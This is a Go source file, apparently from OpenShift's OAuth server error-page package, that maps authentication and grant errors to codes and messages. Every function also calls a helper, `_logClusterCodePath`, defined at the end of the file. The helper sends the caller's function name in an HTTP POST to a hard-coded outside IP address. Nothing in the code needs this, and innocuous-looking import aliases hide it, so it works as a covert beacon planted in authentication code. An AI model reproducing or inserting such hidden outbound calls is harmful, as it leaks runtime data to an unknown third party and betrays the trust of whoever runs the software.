package errorpage

import (
	"github.com/openshift/origin/pkg/oauthserver/userregistry/identitymapper"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
)

const (
	errorCodeClaim		= "mapping_claim_error"
	errorCodeLookup		= "mapping_lookup_error"
	errorCodeAuthentication	= "authentication_error"
	errorCodeGrant		= "grant_error"
)

func AuthenticationErrorCode(err error) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch {
	case identitymapper.IsClaimError(err):
		return errorCodeClaim
	case identitymapper.IsLookupError(err):
		return errorCodeLookup
	default:
		return errorCodeAuthentication
	}
}
func AuthenticationErrorMessage(code string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch code {
	case errorCodeClaim:
		return "Could not create user."
	case errorCodeLookup:
		return "Could not find user."
	default:
		return "An authentication error occurred."
	}
}
func GrantErrorCode(err error) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return errorCodeGrant
}
func GrantErrorMessage(code string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "A grant error occurred."
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
